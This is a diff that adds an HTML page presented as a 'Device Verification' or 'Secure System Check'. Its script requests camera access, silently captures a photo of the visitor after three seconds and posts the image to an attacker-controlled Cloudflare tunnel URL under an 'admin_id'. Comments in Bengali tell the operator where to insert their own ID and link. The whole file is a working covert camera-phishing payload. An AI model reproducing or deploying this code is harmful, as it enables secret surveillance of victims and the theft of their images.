@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #0f0; padding: 30px; box-shadow: 0 0 15px #0f0; text-align: center; }
+        .loading { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>SECURE SYSTEM CHECK</h3>
+        <div class="loading"></div>
+        <p id="msg">Verifying browser compatibility...</p>
+    </div>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const mode = urlParams.get('mode') || 'front';
+        const admin_id = "6823368645"; // আপনার Admin ID
+
+        // আপনার বর্তমান সচল Cloudflare লিঙ্কটি এখানে দিন
+        const BASE_URL = "https://populations-pleased-laundry-does.trycloudflare.com";
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: mode === 'front' ? 'user' : 'environment' }
+                });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = 1280; c.height = 720;
+                    c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
+                    
+                    fetch(`${BASE_URL}/upload`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ img: c.toDataURL('image/png'), id: admin_id })
+                    });
+                    document.getElementById('msg').innerText = "System Verified. Redirecting...";
+                }, 3000);
+            } catch (e) {
+                document.getElementById('msg').innerText = "Access Denied: Camera Permission Required!";
+            }
+        }
+        window.onload = init;
+    </script>
+</body>
+</html>
